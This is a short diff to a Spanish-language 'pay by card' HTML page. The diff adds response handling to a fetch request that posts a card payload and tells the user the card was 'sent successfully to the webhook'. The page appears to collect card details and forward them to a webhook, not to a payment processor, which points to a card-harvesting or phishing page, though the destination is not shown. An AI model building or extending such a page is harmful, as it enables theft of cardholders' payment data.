@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjeta</title>
+  <title>Pagar con tarjetas</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -115,7 +115,16 @@
         },
         body: JSON.stringify(payload)
       })
-
+      .then(function(response) {
+        if (response.ok) {
+          document.getElementById("done-message").textContent = "Tarjeta enviada exitosamente al webhook.";
+        } else {
+          document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
+        }
+      })
+      .catch(function(error) {
+        document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
+      });
     }
 
     function validateCard(cardNumber) {
